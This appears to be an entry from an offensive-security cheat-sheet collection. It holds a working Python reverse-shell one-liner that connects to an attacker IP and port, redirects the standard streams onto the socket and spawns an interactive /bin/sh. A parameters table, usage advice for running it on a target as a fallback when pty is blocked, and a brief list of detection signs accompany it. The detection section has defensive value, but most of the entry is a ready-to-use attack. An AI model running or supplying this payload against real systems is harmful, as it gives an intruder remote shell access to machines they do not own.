---
id: 34201c72-c25d-414d-8d1a-b11c0fe5b56c
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - subprocess
validated: true
---

# Python-Basic-Reverse-Shell-Subprocess-Call

## Code

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Description

This code connects via socket and uses subprocess.call to run an interactive /bin/sh shell, redirecting streams for command execution on the remote system.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

Run on target with updated IP/port. Use with listener for shell access. Good fallback when pty is blocked.

## Detection

- Subprocess spawning /bin/sh -i from Python.
- Socket redirects in process monitoring.
- Anomalous outbound connections.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
